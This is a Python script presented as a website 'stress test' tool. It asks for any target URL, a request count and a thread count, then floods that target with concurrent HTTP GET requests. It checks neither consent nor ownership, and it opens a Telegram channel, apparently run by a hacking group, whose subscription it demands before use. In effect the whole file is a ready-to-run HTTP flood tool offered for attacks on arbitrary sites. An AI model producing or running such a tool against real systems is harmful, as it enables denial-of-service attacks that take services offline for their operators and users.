import requests
import threading
import time
import webbrowser
import os
from colorama import Fore, Style
channel_url = 'https://t.me/Arab_Hk_01'

def send_request(url):
    try:
        response = requests.get(url)
        status_code = response.status_code
        if status_code == 502:
            print("Request sent. Status code:", status_code)
        else:
            print("Request sent. Status code:", status_code)
    except requests.exceptions.RequestException as e:
        print("Request failed:", e)

def stress_test(url, num_requests, num_threads):
    threads = []
    
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()
        if len(threads) >= num_threads:
            for t in threads:
                t.join()
            threads = []

    # Wait for all threads to complete
    for t in threads:
        t.join()

def clear_console():
    # Clear console based on the operating system
    os.system('cls' if os.name == 'nt' else 'clear')

def typewriter_effect(text, delay=0.05):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def print_logo():
    logo =f"{Fore.GREEN}" """──────────────────────────────────────────────────────────⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⣉⣉⣩⣥⣤⣤⣤⣤⣭⣉⣉⠉⠉⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⢁⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣈⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⢁⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢁⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠋⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠏⠀⣴⣿⣿⣿⣿⡿⠟⠋⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣋⠭⢂⣠⠖⣰⡖⣶⡰⣦⣐⠮⣍⣙⠻⢿⣿⣿⣿⣿⣿⣿⣦⡉⠛⢿⣿⣿⣿⣿⣷⡀⠙⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠋⢠⣾⣿⣿⠟⡻⠉⠀⣠⣾⣿⣿⣿⣿⡿⠋⣡⣴⣿⠟⣡⣾⣿⠏⣴⣿⠃⣿⣿⡘⢿⣷⣦⡙⢿⣶⣬⣙⠿⢿⣿⣿⣿⣿⣆⠀⠈⠛⡛⢿⣿⣿⣆⠈⢿⣿⣿⣿⣿
⣿⣿⣿⡿⠁⣠⣿⣿⠋⢠⡟⠀⢀⡴⢻⣿⣿⣿⠟⣡⣼⣛⡻⠿⣡⣾⣿⣿⡏⢰⣿⣿⣀⣿⣿⣧⠘⣿⣿⣿⣦⠹⠿⣛⣻⣤⡙⢿⣿⣿⣯⢣⡀⠀⠹⡄⠙⢿⣿⣧⠀⢻⣿⣿⣿
⣿⣿⡿⠁⣰⣿⢟⠇⠀⣸⢁⡴⠋⢠⣿⣿⡟⣡⣼⣿⣿⣿⡟⣠⣦⣭⣭⣛⢡⣿⠛⠛⣉⠛⠛⢿⣧⣿⣯⣭⣵⣦⠘⣿⣿⣿⣿⣦⠻⣿⣿⣆⠉⠢⣄⢻⠀⠈⡟⢿⣧⠀⢻⣿⣿
⣿⣿⠃⣠⣿⠃⣾⠀⢠⠟⠁⠀⣠⣾⣿⢋⣴⣿⣿⣿⣿⡟⣰⣿⣿⣿⣿⣿⢸⣿⡄⠀⡉⡇⠀⢸⣿⣿⣿⣿⣿⣿⣧⠘⣿⣿⣿⣿⣷⡌⢿⣿⣦⡀⠈⠻⡇⠀⢸⠈⢿⣧⠀⢻⣿
⣿⠇⢀⣿⡇⠀⣿⠀⠂⢀⡴⢊⣿⡿⢁⣾⣿⣿⣿⣿⣿⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢁⣤⣾⣿⣿⣿⣿⣿⣿⣿⣇⢹⣿⣿⣿⣿⣿⣆⢻⣿⣇⠰⣀⠈⠀⣼⠀⠈⣿⡆⠘⣿
⣿⠀⣸⣿⠃⠀⢸⠃⡴⠋⢀⣾⣿⢃⣿⣶⣭⣉⣙⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢿⣛⣋⣽⣷⣿⡆⢿⣿⡆⠈⠳⡄⢻⠀⠀⣿⣿⡀⢻
⡇⢠⣿⠋⡆⠀⢸⠎⠀⢀⣾⣿⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡋⠀⢈⣛⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⣿⣿⠄⠀⠈⢿⠀⠀⣿⣿⡇⢸
⡇⢸⣿⠀⣧⠀⠀⠀⣰⠏⣿⣿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢹⣿⡄⣦⡀⠘⠀⢸⡟⢸⣿⠀
⠁⣾⣇⠀⢻⣆⢀⣼⠋⢠⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠐⠀⠒⠚⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⡇⠘⣷⡄⢀⣿⠁⢸⣿⠀
⠀⣿⣿⠀⠈⢿⣸⠃⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⢸⣿⡗⠀⠸⣿⣿⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢾⣿⣇⠀⠈⢷⣸⠃⠀⣸⣿⠀
⡀⢻⡿⡄⠀⠈⡇⠀⢠⡿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⡟⠉⠉⠁⠀⠀⠀⠀⢀⣿⣿⣶⠀⢷⣿⣿⡆⠀⠀⠀⠀⠀⠉⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⡟⣇⠀⢸⠏⠀⢀⣿⣿⠀
⡇⢸⡇⢻⣄⠀⠃⠀⣾⠇⣿⣿⠈⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⡏⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡇⣸⣿⠃⢿⡀⢸⠀⢠⡾⢸⣿⠀
⡇⠘⣿⠀⠻⣧⡀⢠⡟⠀⢸⣿⣆⢹⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇⠀⢸⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⡿⢀⣿⡿⠀⢸⡇⠀⣠⡟⠁⣸⡇⢸
⣿⠀⢻⣦⠀⠈⠳⣬⡇⠀⢨⡻⣿⡎⢿⠿⠛⣋⣩⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡇⠀⢸⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣬⣉⡛⠻⠿⠃⣾⡟⠁⠀⠘⣇⡾⠉⠀⣠⣿⠁⣼
⣿⡆⠈⣿⣷⡀⠀⠈⢇⠀⢸⣧⠙⢿⡜⢿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⠇⣼⠏⢰⡇⠀⢰⠋⠀⠀⣴⣿⠇⢀⣿
⣿⣿⡄⠙⣧⠙⣦⣀⠈⠀⠀⣿⠀⠘⣿⣌⢻⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡿⢃⣾⠏⠀⣾⡇⠠⠃⢀⣤⠾⣸⡟⠀⣼⣿
⣿⣿⣷⡀⠹⣧⡀⠙⠷⣦⣀⠸⡇⠀⠘⡿⣷⣽⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣟⣴⡿⠟⠀⢀⡟⣀⣤⡾⠟⠉⣰⡟⠀⣼⣿⣿
⣿⣿⣿⣷⡀⠹⣷⣄⠀⠈⠉⠓⢿⡄⠀⢱⡌⠻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠟⢉⡴⠀⠀⡾⠞⠋⠉⠀⣀⣼⡟⠁⣴⣿⣿⣿
⣿⣿⣿⣿⣷⡄⠘⢿⣷⡦⣀⠀⠀⠈⠀⠈⢻⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠃⠀⠊⠀⠀⣀⡠⣾⣿⠏⠀⣼⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣆⠈⠻⣷⡌⠛⠷⠶⣶⣦⣤⣹⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣎⣡⣤⣶⠶⠾⠟⢋⣼⡿⠋⢠⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠉⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠈⠁⠀⠀⠀⠀⠀⣀⣠⣴⡿⠋⢀⣴⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣄⠙⠻⣿⣏⠓⠶⠶⠶⠶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⠶⠶⠶⠶⠖⣋⣿⡿⠋⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠛⢷⣦⣤⣀⣀⡀⣀⣀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⣀⣀⣀⣀⣠⣤⣾⠟⠉⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠈⠙⠿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡿⠟⠉⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⡉⠛⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠛⠋⣁⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿──────────────────────────────────────────────────────────"""

    typewriter_effect(logo, 0.002)

def main():
    print_logo()

    typewriter_effect("لاستخدام هذه الأداة عليك الاشتراك في قناتنا على التليجرام\nchannel: https://t.me/Arab_Hk_01", 0.05)
    webbrowser.open(channel_url)
    input("اضغط على Enter بعد الاشتراك في قناة التليجرام...")

    # Clear the console after user confirms subscription
    clear_console()

    # Display the logo again after clearing the console
    print_logo()

    target_url = input("Enter the target URL: ").strip()
    total_requests = int(input("Enter the total number of requests: ").strip())
    max_threads = int(input("Enter the number of threads: ").strip())

    start_time = time.time()
    stress_test(target_url, total_requests, max_threads)
    end_time = time.time()

    print("Stress test completed in", end_time - start_time, "seconds")

if __name__ == "__main__":
    main()
